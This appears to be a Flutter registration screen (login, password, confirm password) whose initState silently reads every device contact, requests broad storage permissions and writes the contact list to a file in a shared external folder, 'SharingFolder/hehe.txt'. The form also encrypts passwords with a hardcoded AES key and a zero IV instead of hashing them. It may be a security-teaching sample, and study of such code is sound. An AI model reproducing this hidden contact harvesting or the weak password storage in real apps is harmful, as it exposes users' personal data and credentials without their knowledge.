import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'dart:io';

class RegisterApp extends StatefulWidget {
  const RegisterApp({Key? key}) : super(key: key);

  @override
  _RegisterAppState createState() => _RegisterAppState();
}

class _RegisterAppState extends State<RegisterApp> {
  final GlobalKey<FormState> _key = GlobalKey<FormState>();
  final TextEditingController _pass = TextEditingController();
  final TextEditingController _login = TextEditingController();
  final TextEditingController _passConf = TextEditingController();
  List<Contact>? contacts;

  @override
  void initState() {
    super.initState();
    getAllContacts();
  }

  getAllContacts() async {
    if (await FlutterContacts.requestPermission()) {
      contacts = await FlutterContacts.getContacts();
      var status = await Permission.storage.status;
      if (!status.isGranted) {
        await Permission.storage.request();
      }
      var status2 = await Permission.manageExternalStorage.status;
      if (!status2.isGranted) {
        await Permission.manageExternalStorage.request();
      }
      var status3 = await Permission.accessMediaLocation.status;
      if (!status3.isGranted) {
        await Permission.accessMediaLocation.request();
      }

      final directory =
          (await Directory('storage/emulated/0/SharingFolder').create()).path;
      print("dope");
      final file = File('$directory/hehe.txt');
      await file.create();
      await file.writeAsString(contacts.toString());
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      theme: ThemeData(
        primarySwatch: Colors.deepPurple,
      ),
      home: Scaffold(
        appBar: AppBar(
            centerTitle: true,
            title: const Text('Register below'),
            leading: IconButton(
                icon: Icon(Icons.arrow_back),
                onPressed: () => Navigator.pop(context))),
        body: Form(
          key: _key,
          child: Column(
            children: [
              TextFormField(
                controller: _login,
                decoration: const InputDecoration(labelText: "Login"),
                validator: (value) {
                  if (value == null || value.isEmpty) return "Field required";

                  return null;
                },
              ),
              TextFormField(
                controller: _pass,
                decoration: const InputDecoration(labelText: "Password"),
                validator: (value) {
                  if (value == null || value.isEmpty) return "Field required";
                  String passwordPattern =
                      r'^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[!@#\$&*~]).{8,}$';
                  if (!RegExp(passwordPattern).hasMatch(value)) {
                    return '''
The password has to be at least 8 characters,
include a capital letter, a number and a symbol
                      ''';
                  }
                  return null;
                },
              ),
              TextFormField(
                controller: _passConf,
                decoration:
                    const InputDecoration(labelText: "Confirm Password"),
                validator: (value) {
                  if (value == null || value.isEmpty) return "Field required";
                  if (value != _pass.text) {
                    return "Passwords don't match";
                  }
                  return null;
                },
              ),
            ],
          ),
        ),
        floatingActionButton: FloatingActionButton(
          child: const Icon(Icons.login),
          onPressed: () async {
            final prefs = await SharedPreferences.getInstance();
            String login = _login.text;
            String pass = _pass.text;
            if (_key.currentState!.validate()) {
              _key.currentState!.save();
              final String? check = prefs.getString(login);
              if (check == null) {
                final key =
                    encrypt.Key.fromUtf8('SuperSecretKeyPleaseDontLook!!!!');
                final iv = encrypt.IV.fromLength(16);
                final encrypter = encrypt.Encrypter(encrypt.AES(key));
                final encryptedPass = encrypter.encrypt(pass, iv: iv);
                await prefs.setString(login, encryptedPass.base64);
                showDialog<String>(
                  context: context,
                  builder: (BuildContext context) => AlertDialog(
                    title: const Text('Registration successful'),
                    content: const Text('Please log in'),
                    actions: <Widget>[
                      TextButton(
                        onPressed: () => Navigator.pop(context, 'OK'),
                        child: const Text('OK'),
                      ),
                    ],
                  ),
                );
              } else {
                showDialog<String>(
                  context: context,
                  builder: (BuildContext context) => AlertDialog(
                    title: const Text('You are already registered'),
                    content: const Text('Please go to login page'),
                    actions: <Widget>[
                      TextButton(
                        onPressed: () => Navigator.pop(context, 'OK'),
                        child: const Text('OK'),
                      ),
                    ],
                  ),
                );
              }
            }
          },
        ),
      ),
    );
  }
}
